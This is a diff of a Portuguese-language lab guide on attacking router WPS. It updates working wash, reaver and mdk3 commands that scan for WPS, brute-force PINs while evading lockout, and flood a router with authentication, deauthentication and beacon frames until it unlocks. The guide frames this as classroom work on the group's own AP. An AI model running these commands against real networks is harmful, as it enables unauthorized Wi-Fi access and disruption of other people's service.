@@ -116,7 +116,7 @@ sudo wash -i wlan1mon
 
 # Modo scan (recomendado) para analisar ao Redes Sem-Fio com suporte ao WPS (QSS)
 # opções do comando wash: -i (Set interface to capture packets on), -s (Use scan mode)
-wash -i wlan0mon -s
+sudo wash -i wlan1mon -s
 ```
 
 | Campo | Descrição |
@@ -234,12 +234,14 @@ sudo reaver -i wlan1mon -b <BSSID_DO_AP> -c <CANAL> -p <NÚMERO_DO_PIN> -vv
 Se o ataque anterior falhar continuamente ou o AP entrar em bloqueio (*lockout*), utilize um tempo de pausa entre as tentativas para reduzir a chance de travamento — mais lento, porém mais seguro:
 
 ```bash
-reaver -i wlan0mon -b <BSSID_DO_AP> -K 1 -d 302 -vv
+# Contornando o Lockout (Travamento) do Roteador com suporte ao Locked Yes
+sudo reaver -i wlan1mon -b <BSSID_DO_AP> -K 1 -d 302 -vv
 ```
 
 | Parâmetro | Descrição |
 |---|---|
 | `-d 302` | Insere uma pausa de 302 milissegundos entre as tentativas de PIN, evitando disparar o mecanismo de proteção (*lockout*) do roteador. Método mais demorado, porém mais estável. |
+---
 
 ### 🔓 Se o roteador já travou (Locked = Sim)
 
@@ -247,13 +249,13 @@ Alguns firmwares só resetam o estado do WPS após uma queda de conexão/reiníc
 
 ```bash
 # Terminal 1 — ataque de autenticação
-mdk3 wlan0mon a -a <BSSID_DO_AP>
+sudo mdk3 wlan1mon a -a <BSSID_DO_AP>
 
 # Terminal 2 — flood de desautenticação direcionado à rede
-mdk3 wlan0mon x -t <BSSID_DO_AP> -n <ESSID_DO_AP> -s 200
+sudo mdk3 wlan1mon x -t <BSSID_DO_AP> -n <ESSID_DO_AP> -s 200
 
 # Terminal 3 — ataque de beacon flood
-mdk3 wlan0mon b -t <BSSID_DO_AP>
+sudo mdk3 wlan1mon b -t <BSSID_DO_AP>
 ```
 
 > ⚠️ **Uso restrito ao laboratório:** este procedimento gera ruído significativo na rede e deve ser aplicado **apenas** contra o AP do próprio grupo, nunca em produção ou contra equipamentos de terceiros — o objetivo é puramente didático, para observar o comportamento de proteção do firmware.
@@ -261,7 +263,7 @@ mdk3 wlan0mon b -t <BSSID_DO_AP>
 Após alguns instantes, confirme o destravamento consultando novamente:
 
 ```bash
-wash -i wlan0mon
+sudo wash -i wlan1mon
 ```
 
 O campo **Locked** deve voltar a `No`, permitindo repetir o ataque de PIN do passo 05.
